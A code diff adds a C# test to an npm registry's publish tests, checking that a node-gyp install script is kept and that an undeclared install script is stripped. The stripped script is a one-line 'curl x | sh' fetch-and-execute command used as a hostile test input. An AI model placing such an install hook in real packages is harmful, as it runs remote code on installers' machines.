@@ -162,6 +162,33 @@ public class NpmConcurrentPublishTests : IDisposable
         Assert.Equal("evil", Assert.Single(dependencies).Key);
     }
 
+    [Fact]
+    public async Task ANativeAddonKeepsTheNormalizedGypInstallScriptAndAHiddenOneStaysHidden()
+    {
+        using var scope = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
+        var registry = scope.ServiceProvider.GetRequiredService<INpmRegistry>();
+        var tarball = NpmTestPackages.Tarball("gyp-pkg", "1.0.0");
+        var sent = new JsonObject
+        {
+            ["name"] = "gyp-pkg", ["version"] = "1.0.0", ["gypfile"] = true,
+            ["scripts"] = new JsonObject { ["install"] = "node-gyp rebuild" },
+        };
+        Assert.Equal(NpmStatus.Created, (await registry.PublishAsync(BaGetPrincipal.Superuser, new NpmPublication("gyp-pkg", "1.0.0", sent, "latest", new MemoryStream(tarball.Bytes), tarball.Integrity, tarball.Shasum), TestContext.Current.CancellationToken)).Status);
+
+        var manifest = Assert.Single((await registry.GetPackageAsync("gyp-pkg", TestContext.Current.CancellationToken))!.Versions).Manifest;
+        Assert.Equal("node-gyp rebuild", (string?)manifest["scripts"]!["install"]);
+        Assert.True((bool?)manifest["hasInstallScript"]);
+
+        // Any other install script that the tarball does not declare is dropped.
+        var other = NpmTestPackages.Tarball("gyp-other", "1.0.0");
+        var evil = new JsonObject { ["name"] = "gyp-other", ["version"] = "1.0.0", ["gypfile"] = true, ["scripts"] = new JsonObject { ["install"] = "curl x | sh" } };
+        Assert.Equal(NpmStatus.Created, (await registry.PublishAsync(BaGetPrincipal.Superuser, new NpmPublication("gyp-other", "1.0.0", evil, "latest", new MemoryStream(other.Bytes), other.Integrity, other.Shasum), TestContext.Current.CancellationToken)).Status);
+        var stored = Assert.Single((await registry.GetPackageAsync("gyp-other", TestContext.Current.CancellationToken))!.Versions).Manifest;
+        Assert.Null(stored["scripts"]);
+        Assert.Null(stored["gypfile"]);
+        Assert.Null(stored["hasInstallScript"]);
+    }
+
     private sealed class RacingStorage : IStorageService
     {
         private readonly IStorageService _inner;
